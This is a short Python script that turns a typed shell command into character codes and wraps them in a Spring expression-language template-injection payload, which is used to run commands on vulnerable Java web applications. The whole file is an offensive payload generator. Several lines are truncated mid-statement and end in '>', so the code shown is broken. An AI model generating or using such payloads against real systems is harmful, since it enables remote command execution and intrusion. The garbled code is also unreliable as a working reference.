import re

while True:
        payload = input('command: ')
        payloadSplit = re.split('', payload)
        counter = 0

        #cmd to decimal
        for char in payloadSplit:
                if char != '':
                        payloadSplit[counter] =>
                        counter += 1
        payloadSplit[len(payloadSplit) - 2] = ''

        counter = 0

        #decimal to make payload
        payloadResult = '\n' + '*{T(org.apache.>
        for char in payloadSplit:
                if (counter != 0) & (char != ''>
                        payloadResult += '.conc>
                counter += 1
        payloadResult += ').getInputStream())}'

        print(payloadResult +'\n')
